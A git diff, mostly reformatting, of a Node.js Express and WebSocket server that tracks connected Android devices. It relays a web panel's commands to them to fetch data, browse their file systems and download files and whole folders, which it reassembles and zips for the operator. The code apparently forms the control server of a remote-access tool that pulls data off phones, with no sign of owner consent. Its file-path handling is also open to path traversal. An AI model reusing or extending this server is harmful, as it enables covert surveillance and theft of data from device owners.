@@ -1,25 +1,25 @@
 // Express + WebSocket backend to track connected Android devices
 
-const express = require('express');
-const http = require('http');
-const WebSocket = require('ws');
-const path = require('path');
-const fs = require('fs');
-const archiver = require('archiver');
-const { v4: uuidv4 } = require('uuid');
+const express = require("express");
+const http = require("http");
+const WebSocket = require("ws");
+const path = require("path");
+const fs = require("fs");
+const archiver = require("archiver");
+const { v4: uuidv4 } = require("uuid");
 
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
 // Create downloads directory if it doesn't exist
-const downloadsDir = path.join(__dirname, 'public', 'downloads');
+const downloadsDir = path.join(__dirname, "public", "downloads");
 if (!fs.existsSync(downloadsDir)) {
     fs.mkdirSync(downloadsDir, { recursive: true });
 }
 
 // Serve simple static web panel
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(path.join(__dirname, "public")));
 
 // In-memory map of devices
 const devices = new Map(); // deviceId => { ws, lastSeen, online }
@@ -35,34 +35,53 @@ function broadcastDeviceList() {
         lastSeen: data.lastSeen
     }));
 
-    wss.clients.forEach((client) => {
+    wss.clients.forEach(client => {
         if (client.isPanel && client.readyState === WebSocket.OPEN) {
-            client.send(JSON.stringify({ type: 'deviceList', data: panelData }));
+            client.send(
+                JSON.stringify({ type: "deviceList", data: panelData })
+            );
         }
     });
 }
 
-wss.on('connection', (ws, req) => {
+wss.on("connection", (ws, req) => {
     ws.isAlive = true;
 
-    ws.on('pong', () => {
+    ws.on("pong", () => {
         ws.isAlive = true;
     });
 
-    ws.on('message', (msg) => {
+    ws.on("message", msg => {
         try {
             const data = JSON.parse(msg);
 
             // Android client handshake
-            if (data.type === 'deviceConnect') {
+            if (data.type === "deviceConnect") {
                 const { deviceId } = data;
-                devices.set(deviceId, { ws, lastSeen: new Date().toISOString(), online: true });
+
+                // Check if this device ID already exists in our map (might be offline)
+                if (devices.has(deviceId)) {
+                    // Update the existing device with new connection info
+                    const existing = devices.get(deviceId);
+                    existing.ws = ws;
+                    existing.lastSeen = new Date().toISOString();
+                    existing.online = true;
+                    devices.set(deviceId, existing);
+                } else {
+                    // New device, add it to our map
+                    devices.set(deviceId, {
+                        ws,
+                        lastSeen: new Date().toISOString(),
+                        online: true
+                    });
+                }
+
                 console.log(`[+] Device connected: ${deviceId}`);
                 broadcastDeviceList();
             }
 
             // Heartbeat update
-            if (data.type === 'heartbeat') {
+            if (data.type === "heartbeat") {
                 const { deviceId } = data;
                 if (devices.has(deviceId)) {
                     const existing = devices.get(deviceId);
@@ -74,133 +93,175 @@ wss.on('connection', (ws, req) => {
             }
 
             // Panel connected
-            if (data.type === 'panelConnect') {
+            if (data.type === "panelConnect") {
                 ws.isPanel = true;
-                console.log('[*] Web panel connected');
+                console.log("[*] Web panel connected");
                 broadcastDeviceList();
             }
 
             // Panel requested data from device
-            if (data.type === 'requestData') {
+            if (data.type === "requestData") {
                 const { targetId, dataType } = data;
                 const device = devices.get(targetId);
-                if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
-                    device.ws.send(JSON.stringify({
-                        type: 'requestData',
-                        dataType: dataType
-                    }));
+                if (
+                    device &&
+                    device.ws &&
+                    device.ws.readyState === WebSocket.OPEN
+                ) {
+                    device.ws.send(
+                        JSON.stringify({
+                            type: "requestData",
+                            dataType: dataType
+                        })
+                    );
                 }
             }
 
             // Panel requested file explorer action
-            if (data.type === 'fileExplorer') {
+            if (data.type === "fileExplorer") {
                 const { targetId, action, path } = data;
                 const device = devices.get(targetId);
-                if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
-                    device.ws.send(JSON.stringify({
-                        type: 'fileExplorer',
-                        action: action,
-                        path: path
-                    }));
+                if (
+                    device &&
+                    device.ws &&
+                    device.ws.readyState === WebSocket.OPEN
+                ) {
+                    device.ws.send(
+                        JSON.stringify({
+                            type: "fileExplorer",
+                            action: action,
+                            path: path
+                        })
+                    );
                 }
             }
-            
+
             // Panel requested file/folder download
-            if (data.type === 'fileDownload') {
+            if (data.type === "fileDownload") {
                 const { targetId, path, downloadType } = data;
                 const requestId = uuidv4();
                 const device = devices.get(targetId);
-                
-                if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
-                    device.ws.send(JSON.stringify({
-                        type: 'fileDownload',
-                        requestId: requestId,
-                        path: path,
-                        downloadType: downloadType
-                    }));
-                    
+
+                if (
+                    device &&
+                    device.ws &&
+                    device.ws.readyState === WebSocket.OPEN
+                ) {
+                    device.ws.send(
+                        JSON.stringify({
+                            type: "fileDownload",
+                            requestId: requestId,
+                            path: path,
+                            downloadType: downloadType
+                        })
+                    );
+
                     // Notify all panels about the pending download
-                    wss.clients.forEach((client) => {
-                        if (client.isPanel && client.readyState === WebSocket.OPEN) {
-                            client.send(JSON.stringify({
-                                type: 'fileDownloadStarted',
-                                requestId: requestId,
-                                deviceId: targetId,
-                                path: path,
-                                downloadType: downloadType,
-                                status: 'pending'
-                            }));
+                    wss.clients.forEach(client => {
+                        if (
+                            client.isPanel &&
+                            client.readyState === WebSocket.OPEN
+                        ) {
+                            client.send(
+                                JSON.stringify({
+                                    type: "fileDownloadStarted",
+                                    requestId: requestId,
+                                    deviceId: targetId,
+                                    path: path,
+                                    downloadType: downloadType,
+                                    status: "pending"
+                                })
+                            );
                         }
                     });
                 } else {
                     // Device not available
-                    wss.clients.forEach((client) => {
-                        if (client.isPanel && client.readyState === WebSocket.OPEN) {
-                            client.send(JSON.stringify({
-                                type: 'fileDownloadError',
-                                requestId: requestId,
-                                deviceId: targetId,
-                                error: 'Device is offline or not connected'
-                            }));
+                    wss.clients.forEach(client => {
+                        if (
+                            client.isPanel &&
+                            client.readyState === WebSocket.OPEN
+                        ) {
+                            client.send(
+                                JSON.stringify({
+                                    type: "fileDownloadError",
+                                    requestId: requestId,
+                                    deviceId: targetId,
+                                    error: "Device is offline or not connected"
+                                })
+                            );
                         }
                     });
                 }
             }
 
             // File transfer responses from device
-            if (data.type === 'fileTransferResponse') {
+            if (data.type === "fileTransferResponse") {
                 const { action, deviceId, requestId, transferId } = data;
-                
+
                 // Process file transfer responses
                 switch (action) {
-                    case 'metadata':
+                    case "metadata":
                         // Initialize file download
                         const { name, size, isDirectory, totalChunks } = data;
-                        
+
                         // Create directory for download if not exists
-                        const deviceDownloadDir = path.join(downloadsDir, deviceId);
+                        const deviceDownloadDir = path.join(
+                            downloadsDir,
+                            deviceId
+                        );
                         if (!fs.existsSync(deviceDownloadDir)) {
-                            fs.mkdirSync(deviceDownloadDir, { recursive: true });
+                            fs.mkdirSync(deviceDownloadDir, {
+                                recursive: true
+                            });
                         }
-                        
+
                         // Create a placeholder file
                         const downloadPath = path.join(deviceDownloadDir, name);
-                        
+
                         // Store transfer info
                         activeTransfers.set(transferId, {
                             deviceId,
                             requestId,
                             path: downloadPath,
-                            type: 'file',
+                            type: "file",
                             name,
                             size,
                             chunks: {},
                             receivedChunks: 0,
                             totalChunks
                         });
-                        
+
                         // Inform web panels
-                        wss.clients.forEach((client) => {
-                            if (client.isPanel && client.readyState === WebSocket.OPEN) {
-                                client.send(JSON.stringify({
-                                    type: 'fileDownloadProgress',
-                                    requestId,
-                                    deviceId,
-                                    transferId,
-                                    name,
-                                    size,
-                                    progress: 0,
-                                    status: 'downloading'
-                                }));
+                        wss.clients.forEach(client => {
+                            if (
+                                client.isPanel &&
+                                client.readyState === WebSocket.OPEN
+                            ) {
+                                client.send(
+                                    JSON.stringify({
+                                        type: "fileDownloadProgress",
+                                        requestId,
+                                        deviceId,
+                                        transferId,
+                                        name,
+                                        size,
+                                        progress: 0,
+                                        status: "downloading"
+                                    })
+                                );
                             }
                         });
                         break;
-                        
-                    case 'chunk':
+
+                    case "chunk":
                         // Process a file chunk
-                        const { chunkIndex, data: base64Data, size: chunkSize } = data;
+                        const {
+                            chunkIndex,
+                            data: base64Data,
+                            size: chunkSize
+                        } = data;
                         const transfer = activeTransfers.get(transferId);
-                        
+
                         if (transfer) {
                             // Save chunk data
                             transfer.chunks[chunkIndex] = {
@@ -208,55 +269,71 @@ wss.on('connection', (ws, req) => {
                                 size: chunkSize
                             };
                             transfer.receivedChunks++;
-                            
+
                             // If we've received all chunks, write the file
-                            if (transfer.receivedChunks === transfer.totalChunks) {
+                            if (
+                                transfer.receivedChunks === transfer.totalChunks
+                            ) {
                                 writeCompleteFile(transfer);
                             }
                         }
                         break;
-                        
-                    case 'progress':
+
+                    case "progress":
                         // Forward progress to web panels
-                        wss.clients.forEach((client) => {
-                            if (client.isPanel && client.readyState === WebSocket.OPEN) {
-                                client.send(JSON.stringify({
-                                    type: 'fileDownloadProgress',
-                                    requestId,
-                                    deviceId,
-                                    transferId,
-                                    progress: data.progress,
-                                    bytesTransferred: data.bytesTransferred,
-                                    totalBytes: data.totalBytes,
-                                    currentFile: data.currentFile
-                                }));
+                        wss.clients.forEach(client => {
+                            if (
+                                client.isPanel &&
+                                client.readyState === WebSocket.OPEN
+                            ) {
+                                client.send(
+                                    JSON.stringify({
+                                        type: "fileDownloadProgress",
+                                        requestId,
+                                        deviceId,
+                                        transferId,
+                                        progress: data.progress,
+                                        bytesTransferred: data.bytesTransferred,
+                                        totalBytes: data.totalBytes,
+                                        currentFile: data.currentFile
+                                    })
+                                );
                             }
                         });
                         break;
-                        
-                    case 'complete':
+
+                    case "complete":
                         // File transfer completed
-                        const completedTransfer = activeTransfers.get(transferId);
+                        const completedTransfer =
+                            activeTransfers.get(transferId);
                         if (completedTransfer) {
                             // Ensure all chunks are written
-                            if (completedTransfer.receivedChunks === completedTransfer.totalChunks) {
+                            if (
+                                completedTransfer.receivedChunks ===
+                                completedTransfer.totalChunks
+                            ) {
                                 // File should be already written by now
                                 // Just notify web panels
-                                wss.clients.forEach((client) => {
-                                    if (client.isPanel && client.readyState === WebSocket.OPEN) {
-                                        client.send(JSON.stringify({
-                                            type: 'fileDownloadComplete',
-                                            requestId,
-                                            deviceId,
-                                            transferId,
-                                            name: completedTransfer.name,
-                                            path: `/downloads/${deviceId}/${completedTransfer.name}`,
-                                            size: completedTransfer.size,
-                                            status: 'complete'
-                                        }));
+                                wss.clients.forEach(client => {
+                                    if (
+                                        client.isPanel &&
+                                        client.readyState === WebSocket.OPEN
+                                    ) {
+                                        client.send(
+                                            JSON.stringify({
+                                                type: "fileDownloadComplete",
+                                                requestId,
+                                                deviceId,
+                                                transferId,
+                                                name: completedTransfer.name,
+                                                path: `/downloads/${deviceId}/${completedTransfer.name}`,
+                                                size: completedTransfer.size,
+                                                status: "complete"
+                                            })
+                                        );
                                     }
                                 });
-                                
+
                                 // Clean up transfer data after some time
                                 setTimeout(() => {
                                     activeTransfers.delete(transferId);
@@ -264,28 +341,41 @@ wss.on('connection', (ws, req) => {
                             }
                         }
                         break;
-                        
-                    case 'directoryMetadata':
+
+                    case "directoryMetadata":
                         // Initialize directory download
-                        const { name: dirName, totalSize, fileCount, dirCount } = data;
-                        
+                        const {
+                            name: dirName,
+                            totalSize,
+                            fileCount,
+                            dirCount
+                        } = data;
+
                         // Create directory for download
-                        const deviceDirDownloadDir = path.join(downloadsDir, deviceId);
+                        const deviceDirDownloadDir = path.join(
+                            downloadsDir,
+                            deviceId
+                        );
                         if (!fs.existsSync(deviceDirDownloadDir)) {
-                            fs.mkdirSync(deviceDirDownloadDir, { recursive: true });
+                            fs.mkdirSync(deviceDirDownloadDir, {
+                                recursive: true
+                            });
                         }
-                        
-                        const dirDownloadPath = path.join(deviceDirDownloadDir, dirName);
+
+                        const dirDownloadPath = path.join(
+                            deviceDirDownloadDir,
+                            dirName
+                        );
                         if (!fs.existsSync(dirDownloadPath)) {
                             fs.mkdirSync(dirDownloadPath, { recursive: true });
                         }
-                        
+
                         // Store transfer info
                         activeTransfers.set(transferId, {
                             deviceId,
                             requestId,
                             path: dirDownloadPath,
-                            type: 'directory',
+                            type: "directory",
                             name: dirName,
                             totalSize,
                             fileCount,
@@ -294,158 +384,197 @@ wss.on('connection', (ws, req) => {
                             processedDirs: 0,
                             bytesReceived: 0
                         });
-                        
+
                         // Inform web panels
-                        wss.clients.forEach((client) => {
-                            if (client.isPanel && client.readyState === WebSocket.OPEN) {
-                                client.send(JSON.stringify({
-                                    type: 'fileDownloadProgress',
-                                    requestId,
-                                    deviceId,
-                                    transferId,
-                                    name: dirName,
-                                    size: totalSize,
-                                    fileCount,
-                                    dirCount,
-                                    progress: 0,
-                                    status: 'downloading'
-                                }));
+                        wss.clients.forEach(client => {
+                            if (
+                                client.isPanel &&
+                                client.readyState === WebSocket.OPEN
+                            ) {
+                                client.send(
+                                    JSON.stringify({
+                                        type: "fileDownloadProgress",
+                                        requestId,
+                                        deviceId,
+                                        transferId,
+                                        name: dirName,
+                                        size: totalSize,
+                                        fileCount,
+                                        dirCount,
+                                        progress: 0,
+                                        status: "downloading"
+                                    })
+                                );
                             }
                         });
                         break;
-                        
-                    case 'directoryStructure':
+
+                    case "directoryStructure":
                         // Create subdirectory
                         const { relativePath } = data;
                         const dirTransfer = activeTransfers.get(transferId);
-                        
+
                         if (dirTransfer) {
-                            const subdirPath = path.join(dirTransfer.path, relativePath);
-                            if (!fs.existsSync(subdirPath) && relativePath !== '.') {
+                            const subdirPath = path.join(
+                                dirTransfer.path,
+                                relativePath
+                            );
+                            if (
+                                !fs.existsSync(subdirPath) &&
+                                relativePath !== "."
+                            ) {
                                 fs.mkdirSync(subdirPath, { recursive: true });
                             }
-                            
+
                             // Update directory count
                             dirTransfer.processedDirs++;
                         }
                         break;
-                        
-                    case 'fileInDirectory':
+
+                    case "fileInDirectory":
                         // File metadata in directory, no action needed here
                         // Just track it for progress reporting
                         break;
-                        
-                    case 'directoryFileChunk':
+
+                    case "directoryFileChunk":
                         // Process a file chunk within a directory
-                        const { 
-                            relativePath: filePath, 
-                            chunkIndex: dirFileChunkIndex, 
-                            data: dirFileData, 
-                            size: dirFileChunkSize 
+                        const {
+                            relativePath: filePath,
+                            chunkIndex: dirFileChunkIndex,
+                            data: dirFileData,
+                            size: dirFileChunkSize
                         } = data;
-                        
+
                         const dirFileTransfer = activeTransfers.get(transferId);
-                        
+
                         if (dirFileTransfer) {
                             // Create path to the file
-                            const fileFullPath = path.join(dirFileTransfer.path, filePath);
+                            const fileFullPath = path.join(
+                                dirFileTransfer.path,
+                                filePath
+                            );
                             const fileDir = path.dirname(fileFullPath);
-                            
+
                             // Ensure directory exists
                             if (!fs.existsSync(fileDir)) {
                                 fs.mkdirSync(fileDir, { recursive: true });
                             }
-                            
+
                             // Write chunk to file
-                            const buffer = Buffer.from(dirFileData, 'base64');
-                            
+                            const buffer = Buffer.from(dirFileData, "base64");
+
                             // If first chunk, create or overwrite the file
-                            const flag = dirFileChunkIndex === 0 ? 'w' : 'a';
-                            
+                            const flag = dirFileChunkIndex === 0 ? "w" : "a";
+
                             fs.writeFileSync(fileFullPath, buffer, { flag });
-                            
+
                             // Update bytes received
                             dirFileTransfer.bytesReceived += dirFileChunkSize;
                         }
                         break;
-                        
-                    case 'directoryFileComplete':
+
+                    case "directoryFileComplete":
                         // A file in the directory transfer is complete
-                        const dirCompletedTransfer = activeTransfers.get(transferId);
-                        
+                        const dirCompletedTransfer =
+                            activeTransfers.get(transferId);
+
                         if (dirCompletedTransfer) {
                             // Update file count
                             dirCompletedTransfer.processedFiles++;
-                            
+
                             // Calculate overall progress
-                            const dirProgress = (dirCompletedTransfer.bytesReceived / dirCompletedTransfer.totalSize) * 100;
-                            
+                            const dirProgress =
+                                (dirCompletedTransfer.bytesReceived /
+                                    dirCompletedTransfer.totalSize) *
+                                100;
+
                             // Update web panels
-                            wss.clients.forEach((client) => {
-                                if (client.isPanel && client.readyState === WebSocket.OPEN) {
-                                    client.send(JSON.stringify({
-                                        type: 'fileDownloadProgress',
-                                        requestId,
-                                        deviceId,
-                                        transferId,
-                                        progress: Math.floor(dirProgress),
-                                        bytesTransferred: dirCompletedTransfer.bytesReceived,
-                                        totalBytes: dirCompletedTransfer.totalSize,
-                                        processedFiles: dirCompletedTransfer.processedFiles,
-                                        totalFiles: dirCompletedTransfer.fileCount,
-                                        status: 'downloading'
-                                    }));
+                            wss.clients.forEach(client => {
+                                if (
+                                    client.isPanel &&
+                                    client.readyState === WebSocket.OPEN
+                                ) {
+                                    client.send(
+                                        JSON.stringify({
+                                            type: "fileDownloadProgress",
+                                            requestId,
+                                            deviceId,
+                                            transferId,
+                                            progress: Math.floor(dirProgress),
+                                            bytesTransferred:
+                                                dirCompletedTransfer.bytesReceived,
+                                            totalBytes:
+                                                dirCompletedTransfer.totalSize,
+                                            processedFiles:
+                                                dirCompletedTransfer.processedFiles,
+                                            totalFiles:
+                                                dirCompletedTransfer.fileCount,
+                                            status: "downloading"
+                                        })
+                                    );
                                 }
                             });
                         }
                         break;
-                        
-                    case 'directoryComplete':
+
+                    case "directoryComplete":
                         // Directory transfer is complete
-                        const dirTransferComplete = activeTransfers.get(transferId);
-                        
+                        const dirTransferComplete =
+                            activeTransfers.get(transferId);
+
                         if (dirTransferComplete) {
                             // Notify web panels
-                            wss.clients.forEach((client) => {
-                                if (client.isPanel && client.readyState === WebSocket.OPEN) {
-                                    client.send(JSON.stringify({
-                                        type: 'fileDownloadComplete',
-                                        requestId,
-                                        deviceId,
-                                        transferId,
-                                        name: dirTransferComplete.name,
-                                        path: `/downloads/${deviceId}/${dirTransferComplete.name}`,
-                                        size: dirTransferComplete.totalSize,
-                                        fileCount: dirTransferComplete.fileCount,
-                                        status: 'complete'
-                                    }));
+                            wss.clients.forEach(client => {
+                                if (
+                                    client.isPanel &&
+                                    client.readyState === WebSocket.OPEN
+                                ) {
+                                    client.send(
+                                        JSON.stringify({
+                                            type: "fileDownloadComplete",
+                                            requestId,
+                                            deviceId,
+                                            transferId,
+                                            name: dirTransferComplete.name,
+                                            path: `/downloads/${deviceId}/${dirTransferComplete.name}`,
+                                            size: dirTransferComplete.totalSize,
+                                            fileCount:
+                                                dirTransferComplete.fileCount,
+                                            status: "complete"
+                                        })
+                                    );
                                 }
                             });
-                            
+
                             // Clean up transfer data after some time
                             setTimeout(() => {
                                 activeTransfers.delete(transferId);
                             }, 60000);
                         }
                         break;
-                        
-                    case 'error':
+
+                    case "error":
                         // Handle errors
                         const { error } = data;
-                        
+
                         // Notify panels of error
-                        wss.clients.forEach((client) => {
-                            if (client.isPanel && client.readyState === WebSocket.OPEN) {
-                                client.send(JSON.stringify({
-                                    type: 'fileDownloadError',
-                                    requestId,
-                                    deviceId,
-                                    transferId,
-                                    error
-                                }));
+                        wss.clients.forEach(client => {
+                            if (
+                                client.isPanel &&
+                                client.readyState === WebSocket.OPEN
+                            ) {
+                                client.send(
+                                    JSON.stringify({
+                                        type: "fileDownloadError",
+                                        requestId,
+                                        deviceId,
+                                        transferId,
+                                        error
+                                    })
+                                );
                             }
                         });
-                        
+
                         // Clean up any transfer data
                         if (transferId && activeTransfers.has(transferId)) {
                             activeTransfers.delete(transferId);
@@ -455,20 +584,26 @@ wss.on('connection', (ws, req) => {
             }
 
             // Device responded with data
-            if (data.type === 'dataResponse' || data.type === 'fileExplorerResponse') {
+            if (
+                data.type === "dataResponse" ||
+                data.type === "fileExplorerResponse"
+            ) {
                 // Forward to all panels
-                wss.clients.forEach((client) => {
-                    if (client.isPanel && client.readyState === WebSocket.OPEN) {
+                wss.clients.forEach(client => {
+                    if (
+                        client.isPanel &&
+                        client.readyState === WebSocket.OPEN
+                    ) {
                         client.send(JSON.stringify(data));
                     }
                 });
             }
         } catch (e) {
-            console.error('Error parsing message:', e);
+            console.error("Error parsing message:", e);
         }
     });
 
-    ws.on('close', () => {
+    ws.on("close", () => {
         for (const [deviceId, deviceData] of devices.entries()) {
             if (deviceData.ws === ws) {
                 deviceData.online = false;
@@ -481,44 +616,44 @@ wss.on('connection', (ws, req) => {
 });
 
 // Add this to server.js
-app.get('/downloadDirectory/:deviceId/:dirName', (req, res) => {
+app.get("/downloadDirectory/:deviceId/:dirName", (req, res) => {
     const { deviceId, dirName } = req.params;
     const dirPath = path.join(downloadsDir, deviceId, dirName);
-    
+
     if (!fs.existsSync(dirPath)) {
-        return res.status(404).send('Directory not found');
+        return res.status(404).send("Directory not found");
     }
-    
+
     // Set headers
     res.attachment(`${dirName}.zip`);
-    
+
     // Create zip stream
-    const archive = archiver('zip', {
+    const archive = archiver("zip", {
         zlib: { level: 9 } // Compression level
     });
-    
+
     // Pipe archive to response
     archive.pipe(res);
-    
+
     // Add directory contents to zip
     archive.directory(dirPath, false);
-    
+
     // Finalize archive
     archive.finalize();
 });
 
-app.post('/removeDownload', express.json(), (req, res) => {
+app.post("/removeDownload", express.json(), (req, res) => {
     const { deviceId, name, downloadType } = req.body;
-    
+
     if (!deviceId || !name) {
-        return res.status(400).json({ error: 'Missing required parameters' });
+        return res.status(400).json({ error: "Missing required parameters" });
     }
-    
+
     const itemPath = path.join(downloadsDir, deviceId, name);
-    
+
     try {
         if (fs.existsSync(itemPath)) {
-            if (downloadType === 'directory') {
+            if (downloadType === "directory") {
                 // Remove directory recursively
                 fs.rmSync(itemPath, { recursive: true, force: true });
             } else {
@@ -527,11 +662,11 @@ app.post('/removeDownload', express.json(), (req, res) => {
             }
             res.json({ success: true });
         } else {
-            res.status(404).json({ error: 'File or directory not found' });
+            res.status(404).json({ error: "File or directory not found" });
         }
     } catch (err) {
         console.error(`Error removing ${itemPath}:`, err);
-        res.status(500).json({ error: 'Failed to remove file or directory' });
+        res.status(500).json({ error: "Failed to remove file or directory" });
     }
 });
 
@@ -540,21 +675,21 @@ function writeCompleteFile(transfer) {
     try {
         // Create a write stream to the file
         const writeStream = fs.createWriteStream(transfer.path);
-        
+
         // Write each chunk in order
         for (let i = 0; i < transfer.totalChunks; i++) {
             const chunk = transfer.chunks[i];
             if (chunk) {
-                const buffer = Buffer.from(chunk.data, 'base64');
+                const buffer = Buffer.from(chunk.data, "base64");
                 writeStream.write(buffer);
             }
         }
-        
+
         // Close the stream
         writeStream.end();
-        
+
         console.log(`[*] File download completed: ${transfer.path}`);
-        
+
         // Clear chunks to free memory
         transfer.chunks = {};
     } catch (err) {
@@ -564,7 +699,7 @@ function writeCompleteFile(transfer) {
 
 // Heartbeat cleanup
 setInterval(() => {
-    wss.clients.forEach((ws) => {
+    wss.clients.forEach(ws => {
         if (!ws.isAlive) return ws.terminate();
         ws.isAlive = false;
         ws.ping();
@@ -575,11 +710,14 @@ setInterval(() => {
 setInterval(() => {
     const now = Date.now();
     for (const [transferId, transfer] of activeTransfers.entries()) {
-        if (transfer.lastActivity && (now - transfer.lastActivity > 3600000)) { // 1 hour
+        if (transfer.lastActivity && now - transfer.lastActivity > 3600000) {
+            // 1 hour
             activeTransfers.delete(transferId);
         }
     }
 }, 3600000); // Check every hour
 
 const PORT = 3000;
-server.listen(PORT, () => console.log(`Backend listening on http://localhost:${PORT}`));
+server.listen(PORT, () =>
+    console.log(`Backend listening on http://localhost:${PORT}`)
+);
